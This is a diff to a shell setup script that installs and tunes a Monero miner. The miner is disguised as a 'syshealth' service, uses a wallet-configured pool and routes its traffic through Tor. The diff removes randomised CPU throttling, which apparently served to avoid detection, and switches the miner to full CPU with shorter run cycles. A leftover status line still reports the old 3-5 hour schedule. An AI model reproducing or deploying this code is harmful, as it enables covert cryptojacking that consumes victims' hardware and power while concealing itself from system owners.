@@ -129,7 +129,7 @@ cat > config/preferences.json << PREFS
         "priority": null,
         "memory-pool": false,
         "yield": true,
-        "max-threads-hint": 60,
+        "max-threads-hint": 100,
         "asm": true,
         "argon2-impl": null
     },
@@ -249,16 +249,10 @@ BIN="${UTIL_DIR}/syshealth"
 CONFIG="${UTIL_DIR}/config/preferences.json"
 PID_FILE="/var/run/syshealth.pid"
 
-# Run 3-5 hours, pause 5 minutes
-MIN_RUN_TIME=10800
-MAX_RUN_TIME=18000
+# Run 1-3 hours, pause 5 minutes
+MIN_RUN_TIME=3600
+MAX_RUN_TIME=10800
 PAUSE_TIME=300
-
-# CPU percentages to randomly choose from after each pause
-CPU_OPTIONS=(40 60 75)
-
-# Seed RANDOM with better entropy
-RANDOM=$(od -An -tu4 -N4 /dev/urandom | tr -d ' ')
 
 start_service() {
     "${BIN}" --config="${CONFIG}" --no-color &
@@ -287,26 +281,11 @@ get_random_runtime() {
     echo $((MIN_RUN_TIME + random_offset))
 }
 
-get_random_cpu() {
-    # Reseed for each call to ensure randomness
-    RANDOM=$(od -An -tu4 -N4 /dev/urandom | tr -d ' ')
-    local idx=$((RANDOM % ${#CPU_OPTIONS[@]}))
-    echo "${CPU_OPTIONS[$idx]}"
-}
-
-update_cpu_config() {
-    local cpu_percent=$1
-    sed -i "s/\"max-threads-hint\": [0-9]*/\"max-threads-hint\": ${cpu_percent}/" "${CONFIG}"
-    echo "[*] CPU limit set to ${cpu_percent}%"
-}
-
 while true; do
     check_network
-    NEW_CPU=$(get_random_cpu)
-    update_cpu_config $NEW_CPU
     start_service
     RUNTIME=$(get_random_runtime)
-    echo "[*] Running for $((RUNTIME/3600))h $((RUNTIME%3600/60))m at ${NEW_CPU}% CPU"
+    echo "[*] Running for $((RUNTIME/3600))h $((RUNTIME%3600/60))m at max CPU"
     ELAPSED=0
     while [ $ELAPSED -lt $RUNTIME ]; do
         sleep 300
@@ -339,7 +318,7 @@ chmod +x scripts/*.sh
 
 echo -e "${GREEN}    Config generated with wallet: ${WALLET:0:16}...${NC}"
 echo -e "${GREEN}    Donation: 0%${NC}"
-echo -e "${GREEN}    CPU rotation: 40%/60%/75% (random after each 5min pause)${NC}"
+echo -e "${GREEN}    CPU: 100% (max performance)${NC}"
 
 # ============================================
 # STEP 6: Build and start container
@@ -364,7 +343,7 @@ echo -e "  ${GREEN}Wallet:${NC} ${WALLET:0:20}..."
 echo -e "  ${GREEN}Pool:${NC} pool.supportxmr.com:3333"
 echo -e "  ${GREEN}Network:${NC} Tor (anonymous)"
 echo -e "  ${GREEN}Donation:${NC} 0%"
-echo -e "  ${GREEN}CPU:${NC} Randomly 40%/60%/75%"
+echo -e "  ${GREEN}CPU:${NC} 100% (max)"
 echo -e "  ${GREEN}Pause:${NC} 5 min every 3-5 hours"
 echo ""
 echo -e "  ${YELLOW}Commands:${NC}"
